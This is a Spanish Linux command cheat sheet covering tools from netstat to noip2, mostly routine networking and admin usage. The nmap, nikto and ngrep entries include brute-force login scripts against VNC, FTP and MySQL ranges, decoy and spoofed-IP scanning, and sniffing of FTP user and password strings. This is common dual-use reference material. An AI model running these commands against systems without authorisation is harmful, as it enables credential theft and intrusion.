  - Flowtop - herramienta de seguimiento de conexión de filtro de red superior
  - bpfc - compilación BPF (filtro de paquete Berkeley), desmontaje JIT


netstat
Puertos y conexiones.
# netstat --inet --all
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      852/connmand
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      21928/cupsd
...
Proto.- protocolo, Recv-Q.- paquetes recibidos, Send-Q.- paquetes enviados, Local Address.- direccion local, Foreign Address.- direccion remota, State.- estado de la conexión (listen = a la escucha), PID/Program name:* el ID y el nombre del proceso, así como la ubicación del puerto.
# netstat -ac   (puertos abiertos,donde se dirigen y de donde  vienen)
# netstat -atu | grep '*.*'   (Ver todos los servicios que ofrece la máquina)
# netstat -ta  (Lista los servidores que estén corriendo en el sistema)
# netstat -rn  (Muestra la tabla de enrutamiento)
# netstat  -an (Máxima información de nuestra conexión)
# netstat  -i (Tablas de Interfaces de red)
# netstat -e (información extendida)
# netstat -p (numero de PID y servicio que está corriendo)
# netstat -c (Lista continua)
# netstat -l (Sockets a la espera)
# netstat -napt (puertos abiertos y servicios que corren)
# netstat -pan | grep ESTABLISHED
# netstat -luntp | grep LISTEN | awk '{print $7}'
# netstat -l | grep tcp
# netstat -antp | grep ssh  (preguntar como está un servicio)
# netstat | awk '/EST/{print $5}' | sort  (lista de conexiones establecidas)
# netstat -an | grep -Ec '^tcp.+ESTABLISHED$'  (Muestra conexiones tcp)
# netstat -tpee    (información sobre las conexiones a internet)
# netstat -tunlp  (Muestra servicios activos y a la escucha, pid y puertos)
# if (nc -zw2 lapipaplena.homelinux.com 80); then echo open; fi (Preguntar si el puerto de un host está abierto)
# netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r (Cantidad y estado de los puertos abiertos)
# netstat -luntp | grep LISTEN | awk '{print $7}'  (pid de los servicios en LISTEN y demonio que corre en ellos)
# netstat -n -p|grep SYN_REC | wc -l  (Muestra si estamos sufriendo un ataque ddos)
# netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u (Todas las ip conectadas a nuestro host)
# netstat -plan | grep :80 |  grep ESTABLISHED | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -n (Otra forma de mostralas)
# netstat -plan | grep :80 | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -n (número de peticiones al puerto 80 por cada IP)
# netstat -plutn
Explicación de los Flags:
	G (La ruta utiliza una pasarela)
	U (La interfaz está activa)
	H (Esta interfaz permite el acceso a una sola máquina)
	D (Esta ruta es creada dinámicamente)
	M (estee registro ha sido modificado por un mensaje de redirección ICMP)
	! (La ruta es una ruta de rechazo y los datagramas serán descartados)
Nota.- la dirección externa si no es 0.0.0.0.* significa que alguien le está hablando activamente.
Otras opciones:
	-o (indica el número del proceso asignado a la conexión)
	-s (muestra las estadísticas detalladas para cada protocolo)
	-t (muestra solo las conexiones activas por TCP)
	-u (muestra solo las conexiones activas por UDC)


netstress
Utilidad cliente/servidor diseñada para comparar la actividad de la red de un dispositivo o ruta Ethernet determinada utilizando datos y tamaños de paquetes simulados (aleatorios) del mundo real en lugar de datos y tamaños de paquetes fijos.
# netstress -v -m localhost -h 37.128.231.132 -w (con la máxima información, especificando nombre del host y la ip y hacer sólo prueba de escritura lectura/escritura)


nettlet-hash
Generar claves de ficheros
$ nettlet-hash --list  (lista los algoritmos que pueden usarse)
$ nettlet-hash -a sha224 fichero


netwatch
[netdiag]. Examina todos los paquetes que viajan en una red Ethernet y analiza los paquetes IP. La información se cuenta de acuerdo con los hosts de origen y destino. Una pantalla ncurses indica un estado de lista dual para todos los hosts. La zona izquierda se refiere a hosts LOCALES. La lista de la derecha se refiere a hosts REMOTOS. Es posible examinar estadísticas sobre el número de paquetes, bytes, tipo de servicio IP y último host de comunicación para cada host. Con las teclas de flecha (izquierda y derecha) se cambia la visualización.
# netwatch -n -e eth0 (no resolviendo las ips de la interfaz eth0)


network-test
[ifupdown-extra]. Chequea y verifica que la red funciona como es debido.
# network-test


netwox
Este comando proporciona un menú con más de 200 herramientas [sniffers, spoofing, udp/tcp clients/servers, scan, ping, DNS, FTP, HTTP, IRC, NNTP, SMTP, SNMP, SYSLOG, TELNET, TFTP] para encontrar y resolver problemas de red.
# netwox (entrar en el menú)
Control-c para cerrar el menú


newgrp
Permite cambiar el grupo primario de la sesión actual de shell sin necesidad de cerrar sesión o usar "su" para cambiar de usuario. No pide contraseña a menos que el grupo al que se intenta acceder esté protegido y tambien es necesario que el usuario esté incluido en el grupo al que se intenta cambiar. Se puede verificar con el comando.
$ groups
$ newgrp scripts (para unirte a un grupo llamado "scripts", puedes cambiar temporalmente tu grupo primario a ese grupo)
$ id (Ver tu grupo actual)
$ newgrp scripts -c 'touch archivo.txt' (ejecutar un solo comando bajo otro grupo)
$ exit (te devolverá al grupo original antes de usar newgrp)


newpid
Lanzar un comando con un nuevo PID.
# newpid htop


newsbeuter
Lector RSS en consola
$ newsbeuter -i archivo.opml  (cargar los feeds de otra aplicación)
$ newsbeuter -r (arrancar la aplicación obteniendo todas las fuentes)
$ newsbeuter -e (exportar las fuentes a un archivo)
Algunos atajos [newsbeuter -h]:
	q (Subir pantalla/salir de la aplicación)
	Q (Salir de la aplicación)
	C (Marcarlos todos como leidos)
	A (Fuente leida)
	n (Pasar a siguiente fuente no leida)
	p (Pasar a la anterior fuente no leida)
	o (Abrir noticia en el navegador [lynx por defecto ])
	u (Ver listado de URLs de la noticia, Introduciendo el indice la abre)
	/ (Abrir busqueda)
	? (Abrir diálogo de ayuda)
1.-
Algunos ajustes en el archivo de configuración:
$ nano .newsbeuter/config
## Leer fuentes al arrancar la aplicación:
auto-reload yes
## Releer las fuentes cada 15 minutos:
reload-time 15
## Guardar los articulos 15 dias:
keep-articles-days 15
## Navegador que abre la noticia [elinks para ssh y firefox para las X]
#browser "elinks %u"
browser "firefox %u"
## No usar sonido indicando nuevas noticias:
notify-beep no
## Salir sin confirmación:
confirm-exit no
## Usar mplayer para los videos [en las X]
player "mplayer %u"
#### colores soportados: black, red, green, yellow, blue, magenta, cyan y white.
#### Los atributos que pueden especificarse son: standout [Cursiva],
#### underline [Subrayar], reverse [Invertir colores de letra y fondo],
#### blink [parpaderar], dim [oscurecer] y bold [negrita]
## Fondo de pantalla: letra amarilla y fondo negro:
color listnormal yellow black
## Linea de foco: letra roja y fondo blanco:
color listfocus red white
## Primera linea superior y penúltima inferior: letra blanca en negrita y fondo rojo
color info white red bold
## Linea inferior de notificaciónes: letra azul en negrita con fondo negro
color background blue black bold
## Como se muestran los articulos: letra cyan con fondo negro:
color article cyan black
## Foco en nueva noticia no leida: letra blanca en cursiva con fondo amarillo:
color listfocus_unread white yellow standout
## Nuevas noticias no leidas: letra azul con fondo magenta:
color listnormal_unread blue magenta
2.-
Para incorporar los feeds de google reader editar o crear si no existe:
$ nano .newsbeuter/config
texto que se tiene que agregar:
	urls-source "googlereader"
	googlereader-login "login_de_googlereader"
	googlereader-password "contraseña"


newsboat
Lector de noticias RSS. Descargar de <http://github.com/newsboat/newsboat.git>
Los feeds se han de colocar en un archivo de texto, por ejemplo, feeds.txt con el siguiente formato:
<a title="Linkification: https://site.com/feed/" href="https://site.com/feed/" class="linkification-ext">https://site.com/feed/</a>
Lanzar la aplicación:
$ newsboat -ru rss feeds.txt (-u es para indicar el archivo de texto que contiene los feeds y -r para que se actualicen)
Para abrir noticia en el navegador pulsar "o" y para salir "q"


nftables
Herramienta que proporciona filtrado y clasificación de paquetes que reemplaza frameworks existentes (iptables, ip6tables, arptables y ebtables). Podemos comprobar si la instalación se ha efectuado correctamente arrancando el modulo con:
# modprobe nf_tables
# modprobe nf_tables_ipv4
Y verificando si está en uso:
# lsmod | grep nf_tables
Formas de uso:
# nft list tables (ver el listado de tablas)
# nft list tables ip (ver listado de la familia ip)
# nft list table ip filter (ver el contenido de una tabla)
# nft add table ip filter (agregar tablas)
# nft delete table ip filter (eliminar tablas)
# nft flush table ip filter (eliminar todas las reglas de una tabla)
# nft add chain ip filter input { type filter hook input priority 0 \; } (agregar cadenas [nat, filter i route])
# nft delete chain ip filter input (eliminar cadenas)
# nft add rule ip filter input tcp dport 80 drop (agregar una regla)
# nft delete rule ip filter input handle 2 (eliminar regla)
# nft add rule filter input iifname eth0 tcp dport 80 counter accep (aceptar paquetes en el puerto 80)
# nft add rule filter input tcp dport 1-1024 counter drop (bloquear tráfico en los puertos del 1 al 1024)


nfs
[nfs-kernel-server]. Servidor de archivos.
En el Servidor:
# nano /etc/exports (Para especificar carpetas que se van a compartir)
Formato de las carpetas que se comparte:
/home/usuario/datos 192.168.1.0/24(rw,no_root_squash,sync)
opciones:
192.168.1.0/24 (Compartida por un rango de ips)
192.168.1.8 (Solo para una ip)
rw (lectura y escritura)
no_root_squash (permite a root del cliente accesos root en el servidor)
async (No sincronizando los datos)
sync (Sincronizando los datos)
# /etc/init.d/nfs-kernel-server restart (reiniciar demonio)
# exportfs -a (Releer el archivo exports si se ha modificado)
En el Cliente
# apt-get install nfs-common (Instalar cliente)
# mount -t nfs 192.168.1.8:/home/usuario/datos /media/servidor
Si se desea en el fstab, colocar la linea:
# nano /etc/fstab
192.168.1.2:/home/usuario/datos /media/servidor nfs rw,user 0 0


nfslogsum
Resume los archivos de registro producidos por el programa nfswatch. Por defecto se resume el archivo de registro nfswatch.log
# nfslogsum -n 10 (las 10 primeras entradas)


nfsstat
Consulta datos sobre el servidor NFS
# nfsstat -m (Muestra datos de los puntos de montaje sólamente)


nfswatch
Herramienta para monitorizar el tráfico NFS. Puede capturar y analizar los paquetes NFS en una interfaz de red particular o en todas las interfaces. También monitorea el tráfico de respuesta NFS desde un servidor para medir el tiempo de respuesta de cada RPC.
# nfswatch (entra en el prompt de la aplicación)
Una vez dentro pueden usarse algunas teclas:
	a (mostrar estadísticas sobre usuarios individuales)
	c (mostrar estadísticas sobre hosts de clientes)
	p (mostrar estadísticas sobre procedimientos)
	s (tomar una "instantánea" de la pantalla actual y guárdarla en un archivo)
	- (disminuye el tiempo de ciclo. Por defecto diez segundos)
	+ (aumenta el tiempo del ciclo)
	< (disminuye el tiempo de ciclo en un segundo)
	> (aumenta el tiempo del ciclo en un segundo)
	q (salir)
# nfswatch -all (todos los paquetes desde y hacia la red local)


ngrep
Herramienta para monitorear el tráfico de red. Grep para tráfico de red.
# ngrep port 80  (captura todo lo que use el puerto 80)
# ngrep -d eth0 port 80 (especificando una interfaz de red)
# ngrep -d eth0 "Host:" port 80 (Buscar una expresión en el tráfico)
# ngrep -d eth0 -W byline "Host:" port 80 (mostrar la salida por linea)
# ngrep -e -x PASS (introduciendo una cadena en la busqueda y mostrando lo que no coincida con ella)
# ngrep b    (captura todo usando el filtro por defecto)
# ngrep port 80 -O archivo (redirige la salida a un archivo)
Nota.- Las almoadillas (#) son paquetes que no cumplen la expresión regular.
Otras usos:
# ngrep -d1 -w -i “user|pass” port 21


nice
(Ver renice). Prioridad de un comando o aplicación. Por defecto 10
# nice -n -10 cdrecord
Nota.- Valores, de mayor (-20) a menor (19). Sólo root puede establecer valores negativos.


nicstat
Imprime estadísticas de red para todas las tarjetas de red.
# nicstat -x (ver salida extendida)
# nicstat 5 4 (Imprimir estadísticas para todas las interfaces cada 5 segundos 4 veces)
# nicstat -t (ver estadísticas TCP)
# nicstat -u (ver estadísticas UDP)
# nicstat -a (muestra las estadísticas x, t i u)
# nicstat -i eth0,eth1 3 (Imprimir estadísticas cada 3 segundos solo para las interfaces eth0 y eth1)


nictools-pci
Herramientas que pueden ayudar a diagnosticar problemas con tarjetas Ethernet o, en algunos casos, darles a esas tarjetas la pista final para que funcionen en la red. El paquete está intregado por los siguientes comandos: alta-diag, eepro100-diag, epic-diag, myson-diag, natsemi-diag ne2k-pci-diag, ns820-diag, pci-config, pcnet-diag, rtl8139-diag, starfire-diag, tulip-diag, via-diag, vortex-diag, winbond-diag y yellowfin-diag.
# pci-config
# rtl8139-diag -a


nield
Daemon para recibir notificaciones del núcleo a través del socket de enlace de red y generar registros relacionados con las interfaces NIC [network information service]. Una vez arrancado el daemon [/etc/init.d/nield start] visualizar los logs en /var/log/nield.log.


nikto
[libnet-ssleay-perl libwhisker-perl nmap]. Herramienta de escaneo de servidores web que efectua diferentes comprobaciones tales como, detección de malas configuraciones y vulnerabilidades, detección de ficheros, estructura del servidor, versiones y fechas de actualizaciones de servidores, ataques de fuerza bruta por diccionario, reportes en formatos txt, csv, html, etc.
# nikto -update (Actualizar la aplicación)
# nikto -h host_a_analizar -p 80 (Especificando puerto)
# nikto -h 127.0.0.1:80 (Otro modo de especificar host y puerto)
# nikto -h localhost -p 443 -ssl (Especificando puerto y protocolo)
# nikto	-h localhost -p	443,80 -Format html -output resultado (para dos puertos, salida en formato html y con nombre de archivo)
# nikto -h archivo (a partir de un archivo con una ip o host por linea)


nitrogen
Gestión de fondos de pantalla para escritorios ligeros.
$ nitrogen /home/usuario/imagenes/linux.png (Poner una imagen)
$ nitrogen --restore (Restablecer la imagen despues de un reinicio. Normalmente se coloca en las opciones de inicio, por ejemplo en openbox, se colocaría en .config/openbox/autostart con la sintaxis: nitrogen --restore &)


nl
Muestra en pantalla un archivo de texto con las lineas numeradas. No modifica el archivo.
$ nl fichero.txt
$ nl fichero.txt > fichero_numerado.txt


nload
Monitor de tráfico de red
# nload


nm
Lista las funciones de una biblioteca o programa compilado
$nm fichero.o


nmap
Rastrear puertos.
Estados de los puertos:
	abierto (Una aplicación acepta conexiones TCP o paquetes UDP en este puerto indicando qué servicio está corriendo)
	cerrado (Recibe y responde a las sondas de Nmap, pero no tiene una aplicación escuchando en él)
	filtrado (No puede determinar si el puerto está abierto porque un filtrado de paquetes previene que sus sondas lo alcancen)
	no filtrado (Indica que el puerto es accesible pero que Nmap no puede determinar si se encuentra abierto o cerrado)
	abierto|filtrado (Nmap marca a los puertos en este estado cuando no puede determinar si el puerto se encuentra abierto o filtrado)
Entrada de los objetivos cuando no se realiza por la linea de ordenes:
	-iL ips.txt (Desde una lista de ips colocadas una por linea en el archivo ips.txt)
	-iR 100 (Scanear 100 ips aleatoria. Con -iR 0 el escaneo no termina nunca.)
Técnicas de sondeos de puertos que soporta Nmap:
-sA [sondeo TCP ACK] (Este sondeo no puede determinar puertos abiertos o abiertos|filtrados. Se utiliza para mapear reglas de cortafuegos, y para determinar si son cortafuegos con inspección de estados y qué puertos están filtrados.
-sL [Sondeo de lista] (lista los objetivos a analizar sin enviar paquetes de ningún tipo a los objetivos)
-sM [sondeo TCP Maimon] (El sondeo Maimon debe su nombre a la persona que lo descubrió: Uriel Maimon. Describió la técnica en la revista Phrack número 49 (noviembre de 1996). Nmap, que incluye esta técnica, se publicó dos números más tarde. Esta técnica es exactamente la misma a los sondeos Null, FIN, y Xmas, pero en los que se envía una sonda FIN/ACK. Según el RFC 793 (TCP), se debería generar un paquete RST cuando se responde a dicha sonda independientemente de si el puerto está cerrado o abierto. Uriel se dio cuenta, sin embargo, de que muchos sistemas derivados de BSD simplemente descartan el paquete si el puerto está abierto.
-sN, -sF, -sX [sondeos TCP Null, FIN, y Xmas] (Estos sondeos aprovechan una indefinición en la RFC de TCP que diferencia los puertos abiertos y cerrados. La ventaja fundamental de este tipo de sondeos es que pueden atravesar algunos cortafuegos que no hagan inspección de estados o encaminadores que hagan filtrado de paquetes. Otra ventaja es que este tipo de sondeos son algo más sigilosos que, incluso, un sondeo SYN. Un problema de estos sondeos es que no se puede distinguir los puertos abiertos de algunos puertos filtrados, lo que resulta en la respuesta abierto|filtrado.
-sO [sondeo de protocolo IP] (Este sondeo permite determinar qué protocolos [TCP, ICMP, IGMP, etc.] soportan los sistemas objetivo. Esto no es, técnicamente, un sondeo de puertos, dado que cambia los números de protocolo IP en lugar de los números de puerto TCP ó UDP.
-sP [sondeo ping] (Sólo determina si el objetivo responde. Metodo intrusivo)
-sS [sondeo TCP SYN] (Es el utilizado por defecto. Puede sondear miles de puertos por segundo en una red rápida sin cortafuegos y es relativamente sigiloso y poco molesto, ya que no llega a completar las conexiones TCP)
-sT [sondeo TCP connect()] (Es el sondeo por omisión cuando no se puede utilizar el sondeo SYN. Al realizar conexiones completas para abrir los puertos objetivo en lugar de realizar el reseteo de la conexión medio abierta como hace el sondeo SYN implica que tarda más tiempo y son necesarios más paquetes para obtener la información y que muy probablemente el sistema objetivo va a registrar la conexión.)
-sU [sondeos UDP] (Los 3 servicios UDP más comunes son: DNS [53], SNMP [161/162], y DHCP [67/68].  Los sondeos UDP funcionan mediante el envío (sin datos) de una cabecera UDP para cada puerto objetivo. Si se obtiene un error ICMP indica que el puerto no es alcanzable y se marca como cerrado. Si se recibe cualquier error ICMP no alcanzable se marca el puerto como filtrado. Si se recibe una respuesta al paquete UDP el puerto está abierto. Si no se ha recibido ninguna respuesta después de algunas retransmisiones entonces se clasifica el puerto como abierto|filtrado. Esto significa que el puerto podría estar abierto o que hay un filtro de paquetes bloqueando la comunicación. Puede utilizarse el sondeo de versión (-sV) para diferenciar los puertos abiertos de los filtrados.
-sV [Sondear versiones] (Sondea puertos abiertos para obtener información de la versión del servicio.
-sW [sondeo de ventana TCP] (Aprovecha de un detalle de implementación de algunos sistemas que permite diferenciar puertos abiertos de los cerrados, en lugar de imprimir no filtrado cuando se devuelve un RST.)
--scanflags [Sondeo TCP a medida] (Esta opción permite diseñar su propio sondeo mediante la especificación de banderas TCP arbitrarias y puede ser un valor numérico como el 9 (PSH y FIN), aunque es más sencillo utilizar nombres simbólicos juntando la combinación de URG, ACK, PSH, RST, SYN, y FIN [--scanflags URGACKPSHRSTSYNFIN] donde se fijan todas las banderas, aunque no es muy útil para sondear. Este es un método de sondeo avanzado que permite hacer un sondeo de puertos TCP a ciegas de verdad lo que significa que no se envía ningún paquete al sistema objetivo desde su dirección IP real por lo que es extraordinariamente sigiloso)
Descubrimiento de sistemas:
-P0 [No realizar ping] (Nmap no realiza la etapa de descubrimiento y actua como si cada Ip objetivo se encontrara activa)
-PA22,445 [Ping TCP ACK] (Envía un paquete TCP vacío con la bandera ACK a una lista de puertos separados por comas para determinar si responden.
-PS21,22,25,80 [Ping TCP SYN] (Envía un paquete TCP vacío con la bandera SYN a una lista de puertos separados por comas para saber si el sistema responde.
-PU445,5000 [Ping UDP] (Envía paquetes UDP vacios a los puertos indicados para indicar si el sistema responde. Atraviesan cortafuegos y filtros que sólo analizan TCP)
-PR [Ping ARP] (El sondeo ARP detecta máquinas en la red local)
Especificación de puertos:
	-p 21,22 (Separados por comas)
	-p- (Todos los puertos de 0 al 65535)
	-p 1-1023 (Del 1 al 1023)
	-F (escanear los 100 puertos más usados)
	-r (Analizar los puertos de forma secuencial. Por defecto se analizan de forma aleatoria)
Formatos de salida:
	-oN archivo (Redirigir la salida a un archivo especificado)
	-oX archivo.xml (Redirigir a un archivo xml
	-oS archivo (Redirigiendo a una salida humoristica sobre los script kiddies)
Otras opciones:
	-A (Opciones de sondeos agresivos. Activa detección de sistema operativo [-O] y el análisis de versiones [-sV]).
	-n (No realizar resolución DNS de las direcciones IP activas que encuentre)
	-R (Realizar resolución DNS de todos los objetivos)
	-O (Averiguar el sistema operativo)
	-O --osscan-guess (Averiguar el sistema operativo fonzandolo a identificarse)
	-D 192.168.1.12,192.168.1.13,192.168.1.14 IP_OBJETIVO (Especificando ips falsas separadas por comas para emmascarar la nuestra)
	-T4 (Tiempo de sondeo desde muy lento y fiable [0] a muy rápido e impreciso [5])
	-S IP (Especificando una IP falsa)
	-v (Incrementar el nivel de detalle. -vv mayor incremento de detalle)
nmap scripts
funcionalidad de nmap que permite la realización de diversas tareas de descubrimiento, detección, expotación de diversas vulnerabilidades, etc. Listado en http://nmap.org/nsedoc/index.html y en local: /usr/share/nmap/scripts/:
Categorias:
auth (Identifican credenciales de autenticación en el sistema objetivo frecuentemente por fuerza bruta [ftp-anon, snmp-brute, http-auth...])
broadcast (Realizan un escaneo broadcast en toda la red objetivo sin necesidad de indicar los host de forma manual. utilizando el argumento “newtargets” se indica a Nmap incluir los host descubiertos en la pila de escaneo.)
default (Conjunto de scripts que tratan de capturar la mayor cantidad de información de un objetivo a costa de generar mucho ruido en el sistema remoto.)
discovery (Tratan de mapear los host de la red [registros públicos, dispositivos SNMP, servicios de directorio...])
dos (Intentan causar denegación de servicio sobre un servicio determinado.)
exploit (Tratan de detectar y explotar algún tipo de vulnerabilidad sobre el objetivo.)
external (Los que se comunican con otros hosts distintos del local. Pueden enviar a una fuente externa la IP del objetivo y del atacante.)
fuzzer (Envían datos aleatorios, inesperados o incompletos, con el fin de detectar posibles vulnerabilidades en servicios)
intrusive (Intentan utilizar grandes recursos del sistema objetivo que pueden incluso inutilizarlo)
malware (Intentan determinar si el objetivo se encuentra infectado con maleware o backdoors [smtp-strangeport y auth-spoof])
safe (Scripts poco intrusivos diseñados para no afectar ni dañar el objetivo [ssh-hostkey o html-title])
version (Diseñados para identificar versiones concretas de servicios. Se ejecutan solo si el escaneo tiene la opción Scan Version [-sV])
vuln (Dedicados a la detección de vulnerabilidades pero no su explotación [realvnc-auth-bypass y afp-path-vuln])
Opciones:
# nmap --script-args <argumentos> (Se trata de un conjunto de argumentos que se suministran a los Scripts que admiten parámetros para configurar su ejecución.)
# nmap --script citrix-brute-xml --script-args=userdbd=usernames.lst,passdb=passwords.lst,ntdomain=domain -p 80,443,8080 IP
# nmap --script auth --script-args userdb=usernames.lst,passdb=passwords.lst IP
usernames.lst (base de datos de usuarios. Personalización en /usr/share/nmap/nselib/data/usernames.lst)
passdb (base de datos de contraseñas. Personalización en /usr/share/nmap/nselib/data/passwords.lst)
ntdomain (dominio nt del servidor- previamente ha de averiguarse)
Nota.- En algunos scripts las bases de datos usuarios/paswwords .lst se usan por defecto.
Mostrar información
	--script-help vuln (De una categoria)
	--script-help openlookup-info.nse (De un script)
	--script-help all (De todo)
	--script-trace (toda la comunicación entrante y saliente ejecutada por los scripts es impresa en pantalla)
Actualizaciones:
	--script-db (Actualiza la base de datos localizada en scripts/script.db. Útil si se ha añadido o suprimido alguno
	--script-updatedb (Actualiza los scripts de la base de datos)
Ejemplos:
# nmap -iR 10000 -p 80 (Selecciona objetivos al azar por el puerto 80)
# nmap -sP IP  (Sondeo Ping. Para detectar equipos de una red)
# nmap -P0 IP  (Asume que todos los objetivos están vivos)
# nmap -PS -p 137-139 IP  (Análisis TCP de los puertos indicados)
# nmap -PE IP  (Análisis ICMP del tipo echo)
# nmap -PI IP     (Utiliza paquetes icmp para determinar que hosts están conectados y es especial si deseas hacer un scan a través de un firewall)
# nmap -sF IP     (Analisis sigiloso)
# nmap -sW IP    (especial para máquinas windous)
# nmap -sX IP     (Análisis Xmas)
# nmap -sS -A -p 1-65535 IP  (escanear todos los puertos [-p...] TCP [-sS] y detectar las versiones del software [-A] de forma silenciosa)
# nmap --version-all IP  (Utilizar todas las sondas con intensidad 9 -máxima)
# nmap -p 1-65535 --open localhost  (lista de puertos abiertos)
# nmap -p 80 hostname  (determina si el puerto 80 está abierto)
# nmap -sn 192.168.1.0/24 (descubrir máquinas conectadas de una red)
# nmap -v -sP 192.168.1.0/24 | grep down | wc -l (Ips disponibles en una red)
# nmap -p- localhost (rastrear todos los puertos)
# nmap --iflist (Muestra la lista de interfaces de red y rutas)
# nmap 192.168.0.* --exclude 192.168.0.100 (Excluir un host del escaneo de una red)
# nmap --iflist (encontrar la interfaz y la información del propio host)
Con scripts
# nmap --script="http-* and not http-enum" IP (filtro AND y NOT. Para usar todos los scripts http pero no los de enumeración)
# nmap --script malware IP (Usará todos los scripts de la categoria "malware")
# nmap -sC IP (Usar todos los de la categoria "default" [-sC])
# nmap -PN -p81 --script http-iis-webdav-vuln IP (Buscando vulnerabilidades Webdav)
# nmap --script-trace --script smb-check-vulns -p445 IP (Detectar Conficker, gusano informático que apareció en octubre de 2008, que ataca sistemas Windows)
# nmap -sU -script=citrix-enum-servers -p1604 IP (explorar si hay algún servidor o granja citrix y realizar una enumeración de las aplicaciones publicadas)
# nmap -P0 -n -sS -p445,139 --script=smb-security-mode IP
# nmap --script vnc-brute 127.0.0.1
# nmap -p 22 --script ssh-hostkey host  (especificando puerto)
# nmap -p 5900 --script vnc-brute --script-args passdb=/home/USER/wordlist host (usando un dicccionario)
# nmap --script mysql-brute 192.168.1.1-255 (escaneo de rangos)
# nmap --script vnc-brute localhost (contra un host con vnc a la escucha)
# nmap -sV --script=ftp-brute IP
# nmap --script ftp-brute --script-args userdb=/tmp/users IP
# nmap --script ftp-brute --script-args userdb=/tmp/users,passdb=/tmp/passwds IP
# nmap --script ssh-hostkey --script-args ssh_hostkey=full host
# nmap --script ssh-hostkey --script-args ssh_hostkey=all host
# nmap -sV -sC --script-args ftp-anon.maxlist=-1 IP (Comprueba si un servidor ftp permite conexiones anónimas. El "-1" para desactivar el límite de 20 archivos)
1.-
Fortificando nmap con los scripts vulcan
modulo que permite volver a NMAP en un escaneador de vulnerabilidades haciendo uso de un base de datos en formato .csv. Dichos csv son los siguientes: scipvuldb.csv (http://www.scip.ch/en/?vuldb), cve.csv (http://cve.mitre.org), osvdb.csv (http://www.osvdb.org), securityfocus.csv (http://www.securityfocus.com/bid/), securitytracker.csv (http://www.securitytracker.com), xforce.csv (http://xforce.iss.net), exploitdb.csv (http://www.exploit-db.com) y openvas.csv (http://www.openvas.org). Descargar vulcan de http://www.computec.ch/projekte/vulscan/ y descomprimir el tar.gz. En la carpta vulcan tendremos las bases de datos en formato cvs y un script nse. El nse lo colocamos con el resto de scripts de nmap en /usr/share/nmap/scripts/ y el resto de la carpeta vulcan la mevemos al mismo directorio d scripts:
# mv vulcan/vulscan.nse /usr/share/nmap/scripts/
# mv vulcan /usr/share/nmap/scripts/
Algunas formas de uso:
# nmap -sV --script=vulscan HOST (Comprobará todas las listas de vulnerabilidades))
# nmap -sV --script-args vulscandb=exploitdb HOST -p 80 (Usando una base de datos concreta contra un puerto)
Nota.- las bases de datos están completamente desactualizadas.


nmblookup
[samba]. Resolución de nombres netbios
$ nmblookup -A 192.168.1.125


nmcli
Herramienta de línea de comandos para controlar NetworkManager y para conocer su estado.
$ nmcli device wifi list (listar wifis cercanas)
$ nmcli -m tabular device show (ver todos los dispositivos de red de forma tabulada. Otra opción es multiline)
$ nmcli connection show (ver conexiones activas)
$ nmcli connection (lo mismo)
$ nmcli general status (estado)
$ nmcli device wifi connect SSID_or_BSSID password password (conectarse a una wifi)
$ nmcli device wifi connect SSID_or_BSSID password password hidden yes (conectarse a una wifi oculta)
$ nmcli connection up name_or_uuid (conectarse a una red)
$ nmcli -p -f general,wifi-properties device show wlan0 (ver información extensa [p] y propiedades de los campos expecificados [f])
$ nmcli general permissions (permisos)
$ nmcli device (listado de dispositivos de red y su estado)
$ nmcli device disconnect ifname eth0 (desconectarse de una interfaz)
$ nmcli connection delete name_or_uuid (eliminar una conexion)
$ nmcli radio wifi off (desactivar una wifi)
$ nmcli general reload (reiniciar servicio despues de modificar una conexión)


nmon
Monitor del sistema
# nmon   (arranca la aplicación y muestra las teclas de control para escoger lo que se monitorea. “q” para cerrar la aplicación)


nnn
Administrador de archivos. Muestra en primer lugar los directorios y luego los archivos. La configuración personal se realiza en el archivo ~/.nnncp al estilo:
$ nano .nnncp
	PWD: /home/USER
	SHELL: /bin/bash (null)
	EDITOR: nano (null)
$ nnn
Algunas teclas:
	flechas derecha/izquierda (entrar/salir del directorio hacia/desde directorios superiores o inferiores)
	flechas arriba/abajo (subir/bajar en el arbol del directorio)
	enter (abrir un archivo)
	q (salir)
	? (muestra las teclas de control))


noclobber
Es una opción de la shell [ver set] que permite protegerse de un borrado involuntario de archivos. Esta opción se encuentra desactivada por defecto. Puede configurarse de forma permanente en el archivo .bashrc.
$ set -o noclobber (activarla)
$ set +o noclobber (desactivarla)
Veamos todo un proceso activando la opción y viendo como saltarsela:
	$ date > fecha.txt (escribir la fecha en un archivo)
	$ set -o noclobber (activar la opción)
	$ date > fecha.txt (intentar de nuevo escribir en el archivo sin lograrlo)
	bash: fecha.txt: Cannot overwrite existing file
	$ date >| fecha.txt (saltarse la protección con >|)


nodau
sencillo programa para tomar notas basado en consola. Le permite crear, editar y ver notas fácilmente, y buscarlas por nombre o fecha
$ nodau new linux (crear una nueva nota con el nombre "linux")
$ nodau edit linux (editar la nota "linux")
$ nodau list (listar todas las entradas)
$ nodau list linux (ver si existe una nota llamada "linux")
$ nodau show linux (muestra el contenido de la nota "linux")
$ nodau encrypt emacs (encriptar la nota "emacs". Pide contraseña y confirmación)
$ nodau decrypt emacs (pide contraseña y lo desencripta sin mostrar)
$ nodau append linux (añadir datos a la entrada "linux" sin sobreescribirla)
$ nodau del linux (elimina la nota "linux")


nohup
permite mantener activo un proceso, incluso después de haber cerrado la sesión de usuario.
$ nohup sleep 10000 &   (lanzar el proceso)
[1] 9215     (PID del proceso. Con CTROL-C liberamos el promt y cerramos terminal)
$ pidof sleep   (en otra terminal para verificar que el proceso sigue activo)
$ kill -9 9215  (matar el proceso)


noip2
Servicio de redireccionamiento de ip dinamica a fija. Requiere registro en www.no-ip.com
# noip2 -C    (Inicio de la configuración del servicio)
	Please enter the login/email string for no-ip.com (usuario registro no-ip.com)
	Please enter the password for user ‘usuario@email.com’ (Contraseña no-ip)
	Please enter an update interval:[30] (Intervalo de tiempo para actualización)
	Do you wish to run something at successful update?[N] (y/N)  (intro)
	New configuration file ‘/etc/no-ip2.conf’ created.
# ps aux | grep noip (Comprobar si está corriendo el servicio)
# noip2 -S (Muestra información sobre el proceso activo)
# noip2 -K 1234 (Mata el proceso de noip con el número que le indiquemos)
# noip2 -M (permite multiple instancias de noip2)
